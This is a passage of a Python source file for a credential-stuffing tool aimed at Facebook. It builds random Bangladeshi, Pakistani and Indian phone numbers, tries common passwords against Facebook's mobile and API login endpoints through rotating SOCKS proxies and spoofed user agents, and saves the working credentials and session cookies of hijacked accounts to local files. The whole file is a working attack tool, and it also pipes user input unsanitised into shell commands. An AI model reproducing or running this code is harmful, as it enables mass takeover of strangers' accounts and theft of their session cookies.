                    main_data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ___Main_Uid___,"password": ___Main_Pass___,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                    main_head = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                refat = session.post('https://api.facebook.com/auth/login',data=main_data,headers=main_head,allow_redirects=False).json()
                if 'session_key' in refat:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in refat["session_cookies"])
                    print(f'\r\r{G}[TOP-OK] {___Main_Uid___} | {___Main_Pass___}      ')
                    #print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {cookie}\n')
                    open('/sdcard/TOP/TOP-FILE-M5-OK.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-FILE-COOKIES-M5.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'|'+cookie+'\n');oks.append(___Main_Uid___)
                    break
                elif 'www.facebook.com' in refat['error']['message']:
                    if 'y' in pcp:
                        print(f'\r\r{W}[TOP-CP] {___Main_Uid___} | {___Main_Pass___}      ')
                    open('/sdcard/TOP/TOP-FILE-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');cps.append(___Main_Uid___)
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:self.methodE(___Main_Uid___, __Uid_Name__, ___Main_Pass___)
"""-------------------------(RANDOM MAIN MENU)-------------------------"""
def randommenu():
    global lim
    clear()
    print(f"{G1}[{R}A{G1}]{X}_{Y}_{Z}>{G1} AUTO PASS"+f"WORD             {G1}[{Y}BE"+f"ST{G1}]")
    print(f"{G2}[{R}B{G2}]{X}_{Y}_{Z}>{G2} CUSTOM PASSW"+f"ORD            {G2}[{Y}NE"+f"W{G2}]")
    print(f"{G3}[{R}C{G3}]{X}_{Y}_{Z}>{G3} MAIN ME"+f"NU                 {G3}[{Y}BA"+f"CK{G3}]")
    _________linex_________()
    ________random________ = input(f"{style}{G4} CHOOSE {RE}●{G4} ")
    if ________random________ in ["", " "]:wash("xdg-open https://www.facebook.com/profile.php?id=100007169071530");randommenu()
    elif ________random________ in ["A","a","1","One"]:Random()
    elif ________random________ in ["B","b","2","Two"]:___ChoicePass___()
    elif ________random________ in ["C","c","3","Three"]:___R_E_F_A_T___()
    else:print(f'{style} Select Valid Option');time.sleep(2);randommenu()
"""-------------------------(RANDOM MENU)-------------------------"""
def Random():
    global lim
    clear()
    print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G} BANGLADESH CRACKING")
    print(f"{G1}[{R}B{G1}]{X}_{Y}_{Z}>{G1} PAKISTAN CRACKING")
    print(f"{G2}[{R}C{G2}]{X}_{Y}_{Z}>{G2} INDIA CRACKING")
    print(f"{G3}[{R}0{G3}]{X}_{Y}_{Z}>{G3} BACK SYSTEM")
    _________linex_________()
    _________rnd_________ = input(f"{style}{G4} CHO"+f"OSE {RE}●{G4} ")
    if _________rnd_________ in ["", " "]:wash("xdg-open https://www.facebook.com/profile.php?id=100007169071530");___R_E_F_A_T___()
    elif _________rnd_________ in ["A","a","1","One"]:___Bangladesh___()
    elif _________rnd_________ in ["B","b","2","Two"]:___Pakistan___()
    elif _________rnd_________ in ["C","c","3","Three"]:___India___()
    elif _________rnd_________ in ["0","o","O","Exit"]:randommenu()
    else:print(f'{style} SELECT VALID OPTION.......!');time.sleep(2);Random()
"""-------------------------(CUSTOM PASS)-------------------------"""
def ___ChoicePass___():
    global lim
    clear()
    print(f"{L}[\033[01m\033[94;1m\033[47m ENTER YOUR SIM FIRST FOUR DIGIT CODE\033[40m{L}]")
    _________linex_________()
    print(f"{style} EXA"+f"MPLE BD  {RE}●{G} +880161,+880172,+880183")
    print(f"{style} EXA"+f"MPLE PK  {RE}●{G} +92030,+92031,+92033")
    print(f"{style} EXAM"+f"PLE IN  {RE}●{G} +91620 +91639 +91950")
    _________linex_________()
    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
    try:
        clear()
        print(f'{style} EXAMPLE     {RE}●{G} 3000 5000 10000')
        _________linex_________()
        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
    except ValueError:
        limit = 5000
    lim=limit
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    try:
        print(f"{style} EXAMPLE     {RE}●{G} 102030,Bangladesh,etc ")
        print(f"{style} EXAMPLE     {RE}●{G} 59039200,57273200,etc ")
        print(f"{style} EXAMPLE     {RE}●{G} khan123,khankhan,.etc")
        _________linex_________()
        passx = int(input(f"{style} PASS LIMIT  {RE}●{G} "))
    except:
        passx = 2
    Hossain = []
    _________linex_________()
    for shahriar in range(passx):
        passw = input(f"{G}[{RE}{shahriar+1}{G}] PASSWORD    {RE}●{G} ")
        _________linex_________()
        Hossain.append(passw)
    clear()
    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
    _________linex_________()
    topfire = input(f"{style} SELECT METHOD : ")
    with refatshahriar(max_workers=30) as Refat:
        clear()
        tl = str(len(user))
        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
        print(f"{style} SELECT CODE {RE}●{G} {kode}")
        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
        _________linex_________()
        for psx in user:
            passlist = [psx[1:]]
            ___Main_Uid___ = kode+psx
            for Fahad in Hossain:
                passlist.append(Fahad)
                if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
                elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
                elif topfire in ["C","c","3","Three"]:Random()
                else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
    print("")
    _________linex_________()
    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
    _________linex_________()
    input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
"""-------------------------(BD CRACKING)-------------------------"""
def ___Bangladesh___():
    global lim
    clear()
    print(f'{style} EXAMPLE     {RE}●{G} 016 017 018 019')
    _________linex_________()
    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
    try:
        clear()
        print(f'{style} EXAMPLE     {RE}●{G} 3000 , 5000 , 10000')
        _________linex_________()
        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
    except ValueError:
        limit = 5000
    lim=limit
    for nmbr in range(limit):
        koda = ''.join(random.choice(string.digits) for _ in range(2))
        kodb = ''.join(random.choice(string.digits) for _ in range(2))
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
    _________linex_________()
    topfire = input(f"{style} SELECT METHOD : ")
    with refatshahriar(max_workers=30) as Refat:
        clear()
        tl = str(len(user))
        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
        print(f"{style} SELECT CODE {RE}●{G} {kode}")
        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
        _________linex_________()
        for psx in user:
            ___Main_Uid___ = kode+koda+kodb+psx
            passlist = [koda+kodb+psx,kodb+psx,kode+koda+kodb,kode+kode,'১২৩৪৫৬']
            if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
            elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
            elif topfire in ["C","c","3","Three"]:Random()
            else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
    print("")
    _________linex_________()
    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
    _________linex_________()
    input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
"""-------------------------(PAK CRACKING)-------------------------"""
def ___Pakistan___():
    global lim
    clear()
    print(f'{style} EXAMPLE     {RE}●{G} 0306 0315 0335 0345')
    _________linex_________()
    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
    try:
        clear()
        print(f'{style} EXAMPLE     {RE}●{G} 3000 5000 10000')
        _________linex_________()
        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
    except ValueError:
        limit = 5000
    lim=limit
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
    _________linex_________()
    topfire = input(f"{style} SELECT METHOD : ")
    with refatshahriar(max_workers=30) as Refat:
        clear()
        tl = str(len(user))
        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
        print(f"{style} SELECT CODE {RE}●{G} {kode}")
        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
        _________linex_________()
        for psx in user:
            ___Main_Uid___ = kode+psx
            passlist = [psx,___Main_Uid___,'khankhan','khan1122','khan12345','khan123','khanbaba','pakistan','khanzada','malik123','kingkhan','alikhan','janjan','pak123','pubg123']
            if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
            elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
            elif topfire in ["C","c","3","Three"]:Random()
            else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
    print("")
    _________linex_________()
    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
    _________linex_________()
    input(f"{style} PRESS ENTER TO BACK MAIN MENU....!");___R_E_F_A_T___()
"""-------------------------(IND CRACKING)-------------------------"""
def ___India___():
    global lim
    clear()
    print(f'{style} EXAMPLE     {RE}●{G} +91620 +91639 +91950')
    _________linex_________()
    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
    try:
        clear()
        print(f'{style} EXAMPLE     {RE}●{G} 3000 , 5000 , 10000')
        _________linex_________()
        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
    except ValueError:
        limit = 5000
    lim=limit
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
    _________linex_________()
    topfire = input(f"{style} SELECT METHOD : ")
    with refatshahriar(max_workers=30) as Refat:
        clear()
        tl = str(len(user))
        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
        print(f"{style} SELECT CODE {RE}●{G} {kode}")
        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
        _________linex_________()
        for psx in user:
            ___Main_Uid___ = kode+psx
            passlist = [psx,___Main_Uid___,___Main_Uid___[:7],___Main_Uid___[:6],psx[1:],"59039200","57273200","57575751","57575752","572732000"]
            if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
            elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
            elif topfire in ["C","c","3","Three"]:Random()
            else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
    print("")
    _________linex_________()
    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
    _________linex_________()
    input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
"""-------------------------(FILE MAKE MAIN MENU)-------------------------"""
def Filemake():
    clear()
    print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G} FILE SEPERATE")
    print(f"{G1}[{R}B{G1}]{X}_{Y}_{Z}>{G1} DUPLICATE REMOVER")
    print(f"{G2}[{R}C{G2}]{X}_{Y}_{Z}>{G2} REMOVE USED LINKS {W}({G2}txt{W})")
    print(f"{G3}[{R}D{G3}]{X}_{Y}_{Z}>{G3} BACK THIS PROGRAMMING")
    _________linex_________()
    _________Filemake_________ = input(f"{style}{X}_{Y}_{Z}>{G4} SELECT  {RE}●{G4} ")
    if _________Filemake_________ in ["", " "]:wash("xdg-open https://www.facebook.com/profile.php?id=100007169071530");Filemake()
    elif _________Filemake_________ in ["A","a","1","One"]:Seprate()
    elif _________Filemake_________ in ["B","b","2","Two"]:Duplicate()
    elif _________Filemake_________ in ["C","c","3","Three"]:_____Used___Link___Remover_____()
    elif _________Filemake_________ in ["D","d","4","Four"]:wash("xdg-open https://chat.whatsapp.com/LJk2Vt0ogyTFJDyk2GNqv0");___R_E_F_A_T___()
    else:print(f'{style} SELECT VALID OPTION..... ');time.sleep(2);Filemake()
"""-------------------------(FILE SEPARATE)-------------------------"""
def Seprate():
    clear()
    try:
        print(f"{style} EXAMPLE     {RE}●{G4} 1 , 2 , 3 , 5 , 10");_________linex_________()
        limit = int(input(f'{style} HOW LINKS   {RE}●{G} '))
    except:
        limit = 1
    _________linex_________();print(f'{style} EXAMPLE     {RE}●{G} /sdcard/oldfile.txt');_________linex_________()
    file_name = input(f'\033[0m{style} PUT FILE    {RE}●{G} ');_________linex_________();print(f'{style} EXAMPLE     {RE}●{G} /sdcard/newfile.txt');_________linex_________();new_save = input(f'\033[0m{style} NEW FILE    {RE}●{G} ');_________linex_________();print(f"{style} EXAMPLE     {RE}●{G} [ 10008 , 10007 ]")
    for k in range(limit):
        _________linex_________()
        links=input(f'{style} PUT UID     {RE}●{G} ');wash('cat '+file_name+' | grep "'+links+'" >> '+new_save);_________linex_________()
    print(f'{style} TOTAL IDS   {RE}●{G} '+str(len(open(new_save).read().splitlines())));print(f'{style} FILE SAVED  {RE}●{G} '+new_save);print(f'{style} SEPARATE SUCCESSFULY DONE......');_________linex_________()
    input(f'{style} PRESS ENTER TO BACK MAIN MENU ');___R_E_F_A_T___()
"""-------------------------(DUPLICATE REMOVER)-------------------------"""
def Duplicate():
    clear()
    print(f'{style} EXAMPLE     {RE}●{G} /sdcard/oldfile.txt');_________linex_________()
    file_path = input(f"{style} ENTER FILE  {RE}●{G} ")
    with open(file_path, "r") as file:
        lines = file.readlines()
    with open(file_path, "w") as file:
        file.writelines(set(lines))
    _________linex_________()
    print(f"{style} REMOVE FILE {RE}●{G} {file_path}");print(f"{style} SUCESSFULLY REMOVED DONE....!");_________linex_________()
    input(f"{style} PRESS ENTER TO BACK MAIN MENU");___R_E_F_A_T___()
"""-------------------------(USED LINK REMOVER)-------------------------"""
def _____Used___Link___Remover_____():
    clear()
    print(f'{style} EXAMPLE     {RE}●{G} /sdcard/oldfile.txt');_________linex_________()
    refatinput1 = input(f"{style} FILE PATH   {RE}●{G} ")
    try:
        id = open(refatinput1).read().splitlines()
        total_id = str(len(id))
    except FileNotFoundError:print(f"{style} FILE LOCATION NOT FOUND.......");_________linex_________();time.sleep(2);clear();print(f'{style} TRY AGAIN......');_________linex_________();time.sleep(2);_____Used___Link___Remover_____()
    if ('refat' or 'mrtop' or 'MRTOP') in refatinput1:wash("xdg-open https://www.facebook.com/profile.php?id=100007169071530");___R_E_F_A_T___()
    else:
        _________linex_________()
        print(f"{style} EXAMPLE     {RE}●{G} 1000 , 2000 , 10000 ");_________linex_________()
        toreummah = input(f'{style} PUT LINE    {RE}●{G} ');wash('sed -i 1,'+toreummah+'d '+refatinput1);_________linex_________()
        print(f'{style} REMOVE LINE {RE}●{G} {toreummah}');_________linex_________()
        print(f'{style} TOTAL LINE  {RE}●{G} {total_id}');_________linex_________()
        input(f"{style} ENTER TO BACK MAIN MENU");___R_E_F_A_T___()
"""-------------------------(RANDOM METHOD=1)-------------------------"""
def ___TopRndm1___(___Main_Uid___,passlist,tl):
    global loop,cps,oks,lim
    try:
        for ___Main_Pass___ in passlist:
            session = requests.Session()
            p=round(loop*100/lim,2)
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}R1{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{p}{W}]");sys.stdout.flush()
            rr = random.randint;rc = random.choice
            proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt').text
            open('.socksku.txt','w').write(proxs)
            nip = rc(proxs)
            proxs = {'http': 'socks4://'+nip}
            uau = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(mdl))+" Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            top_login = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr").text
            ___top_data___ = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(top_login)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(top_login)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': ___Main_Uid___,
            'prefill_contact_point': '',
            'prefill_source': '',
            'prefill_type': '',
            'first_prefill_source': '',
            'first_prefill_type': '',
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'true',
            'bi_xrwh': '0',
            'pass': ___Main_Pass___,
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(top_login)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(top_login)).group(1),
            '__dyn': '',
            '__csr': '',
            '__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
            '__a': '',
            '__user': '0',
            '_fb_noscript': 'true'}
            ___top_head___ = {'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': uau,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr"
            lo = session.post(url,data=___top_data___,headers=___top_head___,allow_redirects=False,proxies=proxs).text
            ___Top_Cookies___ = session.cookies.get_dict().keys()
            if 'c_user' in ___Top_Cookies___:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                response = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
                if 'Photoshop' in response:
                    print(f'\r\r{W}[{G}TOP{W}-{G}OK{W}]{G} {uid} {W}|{G} {___Main_Pass___}     ');open('/sdcard/TOP/TOP-RNDM-M2-OK.txt','a').write(uid+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-RNDM-COOKIES-M2.txt','a').write(uid+'|'+___Main_Pass___+'|'+coki+'\n')
                    print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {coki}\n')
                    oks.append(uid)
                else:break
            elif 'checkpoint' in ___Top_Cookies___:
                print(f'\r\r{W}[{R}TOP{W}-{R}CP{W}]{R} {___Main_Uid___} {W}|{R} {___Main_Pass___}       ')
                cps.append(___Main_Uid___)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(20)
"""-------------------------(RANDOM METHOD=2)-------------------------"""
def ___TopRndm2___(___Main_Uid___,passlist,tl):
    try:
        global oks,cps,loop,lim
        p=round(loop*100/lim,2)
        xoxo = random.choice(colors)
        sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}R2{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{p}{W}]");sys.stdout.flush()
        for ___Main_Pass___ in passlist:
            with requests.Session() as session:
                ua = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(5,14))}; {random.choice(mdl)} Build/QP1A.{str(random.randint(111111,999999))}.{str(random.randint(10,999))}) "+''.join(m3ua)
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                fahad = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':___Main_Uid___,'password':___Main_Pass___,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','meta_inf_fbmeta':'','currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate',}
                hossain = {'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent': ua,'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
                refat = session.post('https://api.facebook.com/method/auth.login',data=fahad,headers=hossain,allow_redirects=False).json()
                if 'session_key' in refat:
                    uid=str(refat['uid'])
                    cookie = ";".join(i["name"]+"="+i["value"] for i in refat["session_cookies"])
                    response = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
                    if 'Photoshop' in response:
                        print(f'\r\r{W}[{G}TOP{W}-{G}💉{W}]{G} {uid} {W}|{G} {___Main_Pass___}     ');open('/sdcard/TOP/TOP-RNDM-M2-OK.txt','a').write(uid+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-RNDM-COOKIES-M2.txt','a').write(uid+'|'+___Main_Pass___+'|'+cookie+'\n')
                        #print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {cookie}\n')
                        oks.append(uid)
                    else:break
                elif 'www.facebook.com' in refat['error_msg']:
                    try:fid = refat['error']['error_data']['uid']
                    except:fid = ___Main_Uid___
                    if fid in oks:pass
                    else:
                        #print(f'\r\r{W}[{R}TOP{W}-{R}CP{W}]{R} {fid} {W}|{R} {___Main_Pass___}       ')
                        cps.append(___Main_Uid___);open('/sdcard/TOP/TOP-RNDM-M2-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n')
                        break
                else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(20)

___R_E_F_A_T___()
